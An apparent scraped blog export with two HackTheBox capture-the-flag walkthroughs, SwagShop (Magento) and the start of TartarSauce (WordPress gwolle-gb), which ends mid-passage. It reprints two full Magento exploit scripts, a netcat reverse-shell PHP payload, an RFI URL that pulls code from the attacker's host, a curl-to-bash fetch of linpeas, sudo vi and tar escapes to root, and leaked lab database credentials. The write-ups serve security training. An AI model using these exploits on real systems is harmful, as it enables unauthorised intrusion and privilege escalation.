-oN swagshop_scan.txt PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgTCefp89MPJm2oaJqietdslSBur+eCMVQRW19iUL2DQSdZrIctssf/ws4HWN9DuXWB1p7OR9GWQhjeFv+xdb8OLy6EQ72zQOk+cNU9ANi72FZIkpD5A5vHUyhhUSUcnn6hwWMWW4dp6BFVxczAiutSWBVIm2YLmcqwOEOJhfXLVvsVqu8KUmybJQWFaJIeLVHzVgrF1623ekDXMwT7Ktq49RkmqGGE+e4pRy5pWlL2BPVcrSv9nMRDkJTXuoGQ53CRcp9VVi2V7flxTd6547oSPck1N+71Xj/x17sMBDNfwik/Wj3YLjHImAlHNZtSKVUT9Ifqwm973YRV9qtqtGT | 256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEG18M3bq7HSiI8XlKW9ptWiwOvrIlftuWzPEmynfU6LN26hP/qMJModcHS+idmLoRmZnC5Og9sj5THIf0ZtxPY= | 256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINmmpsnVsVEZ9KB16eRdxpe75vnX8B/AZMmhrN2i4ES7 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Did not follow redirect to http://swagshop.htb/ |_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   Directory Enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir --url http://swagshop.htb/ -w /usr/share/wordlists/dirb/big.txt /.htaccess (Status: 403) [Size: 296] /.htpasswd (Status: 403) [Size: 296] /app (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/app/] /errors (Status: 301) [Size: 313] [--\u0026gt; http://swagshop.htb/errors/] /favicon.ico (Status: 200) [Size: 1150] /includes (Status: 301) [Size: 315] [--\u0026gt; http://swagshop.htb/includes/] /js (Status: 301) [Size: 309] [--\u0026gt; http://swagshop.htb/js/] /lib (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/lib/] /media (Status: 301) [Size: 312] [--\u0026gt; http://swagshop.htb/media/] /pkginfo (Status: 301) [Size: 314] [--\u0026gt; http://swagshop.htb/pkginfo/] /server-status (Status: 403) [Size: 300] /shell (Status: 301) [Size: 312] [--\u0026gt; http://swagshop.htb/shell/] /skin (Status: 301) [Size: 311] [--\u0026gt; http://swagshop.htb/skin/] /var (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/var/]    Inspecting the behavior of the website every clickable part has /index.php/ appended into it Magento scan:  1  php magescan.phar scan:all http://swagshop.htb/   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140  Magento Information +-----------+------------------+ | Parameter | Value | +-----------+------------------+ | Edition | Community | | Version | 1.9.0.0, 1.9.0.1 | +-----------+------------------+ Installed Modules No detectable modules were found Catalog Information +------------+---------+ | Type | Count | +------------+---------+ | Categories | Unknown | | Products | Unknown | +------------+---------+ Patches +------------+---------+ | Name | Status | +------------+---------+ | SUPEE-5344 | Unknown | | SUPEE-5994 | Unknown | | SUPEE-6285 | Unknown | | SUPEE-6482 | Unknown | | SUPEE-6788 | Unknown | | SUPEE-7405 | Unknown | | SUPEE-8788 | Unknown | +------------+---------+ Sitemap Sitemap is not declared in robots.txt Sitemap is not accessible: http://swagshop.htb/sitemap.xml Server Technology +--------+------------------------+ | Key | Value | +--------+------------------------+ | Server | Apache/2.4.18 (Ubuntu) | +--------+------------------------+ Unreachable Path Check +----------------------------------------------+---------------+--------+ | Path | Response Code | Status | +----------------------------------------------+---------------+--------+ | .bzr/ | 404 | Pass | | .cvs/ | 404 | Pass | | .git/ | 404 | Pass | | .git/config | 404 | Pass | | .git/refs/ | 404 | Pass | | .gitignore | 404 | Pass | | .hg/ | 404 | Pass | | .idea | 404 | Pass | | .svn/ | 404 | Pass | | .svn/entries | 404 | Pass | | admin/ | 404 | Pass | | admin123/ | 404 | Pass | | adminer.php | 404 | Pass | | administrator/ | 404 | Pass | | adminpanel/ | 404 | Pass | | aittmp/index.php | 404 | Pass | | app/etc/enterprise.xml | 404 | Pass | | app/etc/local.xml | 200 | Fail | | backend/ | 404 | Pass | | backoffice/ | 404 | Pass | | beheer/ | 404 | Pass | | capistrano/config/deploy.rb | 404 | Pass | | chive | 404 | Pass | | composer.json | 404 | Pass | | composer.lock | 404 | Pass | | vendor/composer/installed.json | 404 | Pass | | config/deploy.rb | 404 | Pass | | control/ | 404 | Pass | | dev/tests/functional/etc/config.xml | 404 | Pass | | downloader/index.php | 404 | Pass | | index.php/rss/order/NEW/new | 200 | Fail | | info.php | 404 | Pass | | mageaudit.php | 404 | Pass | | magmi/ | 404 | Pass | | magmi/conf/magmi.ini | 404 | Pass | | magmi/web/magmi.php | 404 | Pass | | Makefile | 404 | Pass | | manage/ | 404 | Pass | | management/ | 404 | Pass | | manager/ | 404 | Pass | | modman | 404 | Pass | | p.php | 404 | Pass | | panel/ | 404 | Pass | | phpinfo.php | 404 | Pass | | phpmyadmin | 404 | Pass | | README.md | 404 | Pass | | README.txt | 404 | Pass | | shell/ | 200 | Fail | | shopadmin/ | 404 | Pass | | site_admin/ | 404 | Pass | | var/export/ | 404 | Pass | | var/export/export_all_products.csv | 404 | Pass | | var/export/export_customers.csv | 404 | Pass | | var/export/export_product_stocks.csv | 404 | Pass | | var/log/ | 404 | Pass | | var/log/exception.log | 404 | Pass | | var/log/payment_authnetcim.log | 404 | Pass | | var/log/payment_authorizenet.log | 404 | Pass | | var/log/payment_authorizenet_directpost.log | 404 | Pass | | var/log/payment_cybersource_soap.log | 404 | Pass | | var/log/payment_ogone.log | 404 | Pass | | var/log/payment_payflow_advanced.log | 404 | Pass | | var/log/payment_payflow_link.log | 404 | Pass | | var/log/payment_paypal_billing_agreement.log | 404 | Pass | | var/log/payment_paypal_direct.log | 404 | Pass | | var/log/payment_paypal_express.log | 404 | Pass | | var/log/payment_paypal_standard.log | 404 | Pass | | var/log/payment_paypaluk_express.log | 404 | Pass | | var/log/payment_pbridge.log | 404 | Pass | | var/log/payment_verisign.log | 404 | Pass | | var/log/system.log | 404 | Pass | | var/report/ | 404 | Pass | +----------------------------------------------+---------------+--------+    Magento version: | Version | 1.9.0.0, 1.9.0.1 |\nGoing over /app/etc/local.xml\ncreds: mysql : root : fMVWh7bDHpgZkyfqQXreTjU9 db : swagshop  Exploitation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  searchsploit Magento ----------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------- --------------------------------- eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection | php/webapps/38573.txt eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service) | php/webapps/38651.txt Magento 1.2 - \u0026#39;/app/code/core/Mage/Admin/Model/Session.php?login[\u0026#39;Username\u0026#39;]\u0026#39; Cross-Site | php/webapps/32808.txt Magento 1.2 - \u0026#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email\u0026#39; Cros | php/webapps/32809.txt Magento 1.2 - \u0026#39;downloader/index.php\u0026#39; Cross-Site Scripting | php/webapps/32810.txt Magento \u0026lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File | php/webapps/39838.php Magento CE \u0026lt; 1.9.0.1 - (Authenticated) Remote Code Execution | php/webapps/37811.py Magento eCommerce - Local File Disclosure | php/webapps/19793.txt Magento eCommerce - Remote Code Execution | xml/webapps/37977.py Magento eCommerce CE v2.3.5-p2 - Blind SQLi | php/webapps/50896.txt Magento Server MAGMI Plugin - Multiple Vulnerabilities | php/webapps/35996.txt Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion | php/webapps/35052.txt Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass | php/webapps/48135.php   The searchsploit we can ignore eBay, Magento 1.2, Magento \u0026lt;2.0.6. We can work with Magento \u0026lt; 1.9.0.1 but it requires authentication, Magento eCommerce - Local File Disclosure is version 1.7 that does not apply. We can also ignore the plugins. Trying Magento eCommerce - Remote Code Execution\n1  searchsploit -m xml/webapps/37977.py    Modify the target and user and password or leave as default  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  ################################################################################################## #Exploit Title : Magento Shoplift exploit (SUPEE-5344) #Author : Manish Kishan Tanwar AKA error1046 #Date : 25/08/2015 #Love to : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi #Debugged At : Indishell Lab(originally developed by joren) ################################################################################################## import requests import base64 import sys target = \u0026#34;http://swagshop.htb/\u0026#34; if not target.startswith(\u0026#34;http\u0026#34;): target = \u0026#34;http://\u0026#34; + target if target.endswith(\u0026#34;/\u0026#34;): target = target[:-1] target_url = target + \u0026#34;/index.php/admin/Cms_Wysiwyg/directive/index/\u0026#34; q=\u0026#34;\u0026#34;\u0026#34; SET @SALT = \u0026#39;rp\u0026#39;; SET @PASS = CONCAT(MD5(CONCAT( @SALT , \u0026#39;{password}\u0026#39;) ), CONCAT(\u0026#39;:\u0026#39;, @SALT )); SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL; INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (\u0026#39;Firstname\u0026#39;,\u0026#39;Lastname\u0026#39;,\u0026#39;email@example.com\u0026#39;,\u0026#39;{username}\u0026#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW()); INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,\u0026#39;U\u0026#39;,(SELECT user_id FROM admin_user WHERE username = \u0026#39;{username}\u0026#39;),\u0026#39;Firstname\u0026#39;); \u0026#34;\u0026#34;\u0026#34; query = q.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;).format(username=\u0026#34;forme\u0026#34;, password=\u0026#34;forme\u0026#34;) pfilter = \u0026#34;popularity[from]=0\u0026amp;popularity[to]=3\u0026amp;popularity[field_expr]=0);{0}\u0026#34;.format(query) # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}} r = requests.post(target_url, data={\u0026#34;___directive\u0026#34;: \u0026#34;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ\u0026#34;, \u0026#34;filter\u0026#34;: base64.b64encode(pfilter), \u0026#34;forwarded\u0026#34;: 1}) if r.ok: print \u0026#34;WORKED\u0026#34; print \u0026#34;Check {0}/admin with creds forme:forme\u0026#34;.format(target) else: print \u0026#34;DID NOT WORK\u0026#34;   1 2 3  python 37977.py WORKED Check http://swagshop.htb/admin with creds forme:forme    Login in http://swagshop.htb/index.php/admin   “Froghopper” Attack:https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper First we need to enable the Allow Symlinks by going → System → Configuration → Developer. This function allows an administrator to access newsletter templates outside of the newsletter document root.   Going to Catalog → Manage Categories, upload a thumbnail image with extension .php.png we can upload a reverse shell command.  1 2 3  \u0026lt;?php system(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.3 1234 \u0026gt;/tmp/f\u0026#34;); ?\u0026gt;   Hovering over the image uploaded we see the following path: /media/catalog/category/rev.php.png\nNow proceding to Magento “Newsletter Templates” → “Add new template” → “Save Template” → “Preview Template” (This will execute the command)  1  {{block type=\u0026#39;core/template\u0026#39; template=\u0026#39;../../../../../../media/catalog/category/reverse.php.png\u0026#39;\u0026#39;}}   Interactive shell\n1 2 3 4 5 6 7 8 9  python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo fg [Press Enter] export TERM=screen   1 2 3 4 5 6 7 8  $ cd /home $ ls haris $ cd haris $ ls user.txt $ cat user.txt c4d8b161f7a23315aa37b1aea0d8aaf9   Privilege Exploitation 1  sudo -l   1 2 3 4 5 6 7  Matching Defaults entries for www-data on swagshop: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on swagshop: (root) NOPASSWD: /usr/bin/vi /var/www/html/*   1 2 3 4 5 6  cd /var/www/html sudo /usr/bin/vi /var/www/html/get.php :!/bin/sh [Enter]   Note: I had some trouble running the authenticated payload to get RCE\n We can now proceed using the other authenticated payload  1  searchsploit -m php/webapps/37811.py    Need to modify 3 parameters in the config  1 2 3 4 5  Config. username = \u0026#39;forme\u0026#39; password = \u0026#39;forme\u0026#39; php_function = \u0026#39;system\u0026#39; # Note: we can only pass 1 argument to the function  install_date = \u0026#39;Wed, 08 May 2019 07:23:09 +0000\u0026#39; # This needs to be the exact date from /app/etc/local.xml   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  #!/usr/bin/python # Exploit Title: Magento CE \u0026lt; 1.9.0.1 Post Auth RCE # Google Dork: \u0026#34;Powered by Magento\u0026#34; # Date: 08/18/2015 # Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com # Vendor Homepage: http://magento.com/ # Software Link: https://www.magentocommerce.com/download # Version: 1.9.0.1 and below # Tested on: Ubuntu 15 # CVE : none from hashlib import md5 import sys import re import base64 import mechanize def usage(): print \u0026#34;Usage: python %s\u0026lt;target\u0026gt; \u0026lt;argument\u0026gt;\\nExample: python %shttp://localhost \\\u0026#34;uname -a\\\u0026#34;\u0026#34; sys.exit() if len(sys.argv) != 3: usage() # Command-line args target = sys.argv[1] arg = sys.argv[2] # Config. username = \u0026#39;forme\u0026#39; password = \u0026#39;forme\u0026#39; php_function = \u0026#39;system\u0026#39; # Note: we can only pass 1 argument to the function install_date = \u0026#39;Sat, 15 Nov 2014 20:27:57 +0000\u0026#39; # This needs to be the exact date from /app/etc/local.xml # POP chain to pivot into call_user_exec payload = \u0026#39;O:8:\\\u0026#34;Zend_Log\\\u0026#34;:1:{s:11:\\\u0026#34;\\00*\\00_writers\\\u0026#34;;a:2:{i:0;O:20:\\\u0026#34;Zend_Log_Writer_Mail\\\u0026#34;:4:{s:16:\u0026#39; \\ \u0026#39;\\\u0026#34;\\00*\\00_eventsToMail\\\u0026#34;;a:3:{i:0;s:11:\\\u0026#34;EXTERMINATE\\\u0026#34;;i:1;s:12:\\\u0026#34;EXTERMINATE!\\\u0026#34;;i:2;s:15:\\\u0026#34;\u0026#39; \\ \u0026#39;EXTERMINATE!!!!\\\u0026#34;;}s:22:\\\u0026#34;\\00*\\00_subjectPrependText\\\u0026#34;;N;s:10:\\\u0026#34;\\00*\\00_layout\\\u0026#34;;O:23:\\\u0026#34;\u0026#39; \\ \u0026#39;Zend_Config_Writer_Yaml\\\u0026#34;:3:{s:15:\\\u0026#34;\\00*\\00_yamlEncoder\\\u0026#34;;s:%d:\\\u0026#34;%s\\\u0026#34;;s:17:\\\u0026#34;\\00*\\00\u0026#39; \\ \u0026#39;_loadedSection\\\u0026#34;;N;s:10:\\\u0026#34;\\00*\\00_config\\\u0026#34;;O:13:\\\u0026#34;Varien_Object\\\u0026#34;:1:{s:8:\\\u0026#34;\\00*\\00_data\\\u0026#34;\u0026#39; \\ \u0026#39;;s:%d:\\\u0026#34;%s\\\u0026#34;;}}s:8:\\\u0026#34;\\00*\\00_mail\\\u0026#34;;O:9:\\\u0026#34;Zend_Mail\\\u0026#34;:0:{}}i:1;i:2;}}\u0026#39; % (len(php_function), php_function, len(arg), arg) # Setup the mechanize browser and options br = mechanize.Browser() #br.set_proxies({\u0026#34;http\u0026#34;: \u0026#34;localhost:8080\u0026#34;}) br.set_handle_robots(False) request = br.open(target) br.select_form(nr=0) br.form.new_control(\u0026#39;text\u0026#39;, \u0026#39;login[username]\u0026#39;, {\u0026#39;value\u0026#39;: username}) # Had to manually add username control. br.form.fixup() br[\u0026#39;login[username]\u0026#39;] = username br[\u0026#39;login[password]\u0026#39;] = password br.method = \u0026#34;POST\u0026#34; request = br.submit() content = request.read() url = re.search(\u0026#34;ajaxBlockUrl = \\\u0026#39;(.*)\\\u0026#39;\u0026#34;, content) url = url.group(1) key = re.search(\u0026#34;var FORM_KEY = \u0026#39;(.*)\u0026#39;\u0026#34;, content) key = key.group(1) request = br.open(url + \u0026#39;block/tab_orders/period/7d/?isAjax=true\u0026#39;, data=\u0026#39;isAjax=false\u0026amp;form_key=\u0026#39; + key) tunnel = re.search(\u0026#34;src=\\\u0026#34;(.*)\\?ga=\u0026#34;, request.read()) tunnel = tunnel.group(1) payload = base64.b64encode(payload) gh = md5(payload + install_date).hexdigest() exploit = tunnel + \u0026#39;?ga=\u0026#39; + payload + \u0026#39;\u0026amp;h=\u0026#39; + gh try: request = br.open(exploit) except (mechanize.HTTPError, mechanize.URLError) as e: print e.read()n    I encountered an error while running this payload on python and that was the mechanize module I install version 0.3.0 and worked for me, link: https://pypi.org/project/mechanize/0.3.0/#files  1 2 3  tar -xf mechanize-0.3.0.tar.gz python setup.py install   Skills Learned  Exploit modification GTFObins  ","description":"SwagShop is an easy difficulty linux box running an old version of Magento. The version is vulnerable to SQLi and RCE leading to a shell. The www user can use vim in the context of root which can abused to execute commands.","id":8,"section":"posts","tags":["Hackthebox","OSCP","magento","web","vulnerability assessment","outdated software","security tools","magescan","exploit modification","sudo exploitation","remote code execution"],"title":"Hackthebox - Swagshop","uri":"https://hswootan.github.io/en/posts/swagshop/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -vv 10.10.10.88 -oN tartartause_scan.txt   1 2 3 4 5 6 7 8 9 10  PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-title: Landing Page | http-methods: |_ Supported Methods: GET HEAD POST OPTIONSz   Directory Enumeration 1  gobuster dir -u http://10.10.10.88/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   1 2  /webservices (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.88/webservices/] /server-status (Status: 403) [Size: 299]   Let’s visit all the urls in the robots.txt\n1 2 3 4 5 6  User-agent: * Disallow: /webservices/tar/tar/source/ Disallow: /webservices/monstra-3.0.4/ Disallow: /webservices/easy-file-uploader/ Disallow: /webservices/developmental/ Disallow: /webservices/phpmyadmin/   1  gobuster dir -u http://10.10.10.88/webservices/monstra-3.0.4/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   1 2 3 4 5 6 7 8 9  /public (Status: 301) [Size: 337] [--\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/public/] /admin (Status: 301) [Size: 336] [--\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/admin/] /storage (Status: 301) [Size: 338] [--\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/storage/] /plugins (Status: 301) [Size: 338] [--\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/plugins/] /engine (Status: 301) [Size: 337] [--\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/engine/] /libraries (Status: 301) [Size: 340] [--\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/libraries/] /tmp (Status: 301) [Size: 334] [--\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/tmp/] /boot (Status: 301) [Size: 335] [--\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/boot/] /backups (Status: 301) [Size: 338] [--\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/backups/]   Login panel for CMS Monstra v3.0.4\nGot successful login as admin : admin\nLet’s Enumerate once again /webservices path\n1  gobuster dir -u http://10.10.10.88/webservices/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   1  /wp (Status: 301) [Size: 319] [--\u0026gt; http://10.10.10.88/webservices/wp/]   We can start enumerating wordpress\nThe website does not render the actual correct information. This is due to a missing “/”\nTo display this correctly using Burp Suite, Proxy → Options → Match and Replace → Response body → Match: http:/10 → Replace http://10\nAlso add for Response header → Match: http:/10 → Replace: http://10\nNow we see that the website renders correctly and is WordPress\nWe can confirm that we have wp-admin\nExploitation Wordpress Enumeration 1  wpscan --url http://10.10.10.88/webservices/wp/ -e ap --plugins-detection mixed   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103  _______________________________________________________________ __ _______ _____ \\ \\  / / __ \\ / ____| \\ \\  /\\  / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.20 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88] [+] Started: Wed May 4 10:07:30 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.9.4\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: \u0026#39;WordPress 4.9.4\u0026#39; [i] The main theme could not be detected. [+] Enumerating All Plugins (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:08:40 \u0026lt;======================================================\u0026gt; (97942 / 97942) 100.00% Time: 00:08:40 [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] akismet | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/ | Last Updated: 2022-04-25T17:31:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 4.2.3 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200 | | Version: 4.0.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt [+] brute-force-login-protection | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/ | Latest Version: 1.5.3 (up to date) | Last Updated: 2017-06-29T10:39:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403 | | Version: 1.5.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt [+] gwolle-gb | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/ | Last Updated: 2022-03-16T08:17:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | [!] The version is out of date, the latest version is 4.2.2 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200 | | Version: 2.3.10 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt   We found gwolle-gb vulnerable in this machine\n1  searchsploit gwolle   Remote File Inclusion 1 2 3 4 5 6 7 8 9 10 11 12 13  searchsploit -x php/webapps/38861.txt http://10.10.10.88/webservices/monstra-3.0.4/admin/index.php?id=filesmanager\u0026amp;path=uploads/.......//./.......//./.......//./.......//./.......//./.......//./ ---- High-Tech Bridge Security Research Lab discovered a critical Remote File Inclusion (RFI) in Gwolle Guestbook WordPress plugin, which can b e exploited by non-authenticated attacker to include remote PHP file and execute arbitrary code on the vulnerable system. HTTP GET parameter \u0026#34;abspath\u0026#34; is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named \u0026#39;wp-load.php\u0026#39; from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious \u0026#39;wp-load.php\u0026#39; file into his server document root and includes server\u0026#39;s URL into request: http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]   Testing the payload\n1  nc -lnvp 80   1  http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.32/hello   The machine is trying to append wp-load.php\nWe need to get the php reverse shell\nrename the file to wp-load.php\n1 2  python -m SimpleHTTPServer 80 nc -lvnp 1234   1  10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.32   Interactive shell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  which python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo fg [Press Enter] export TERM=screen reset # if cannot see any comands stty -a # to set columns and rows stty rows 28 columns 135   Further enumeration for the linux box in the /var/www directory\n1  curl http://10.10.14.32/linpeas.sh | bash   1  sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh   Ref: https://gtfobins.github.io/gtfobins/tar/#sudo\n1  onuma\u0026#39;s flag: b2d6ec45472467c836f253bd170182c7   Enumerate with linpeas against user onuma\nGet interactive shell again\n1  python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;   These timers triggers events necessary for common maintenance tasks, such as updating system databases, cleaning temporary directories, rotating log files, and more.\n1 2 3 4  locate backuperer.timer /etc/systemd/system/multi-user.target.wants/backuperer.timer /lib/systemd/system/backuperer.timer   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  cat /lib/systemd/system/backuperer.timer [Unit] Description=Runs backuperer every 5 mins [Timer] # Time to 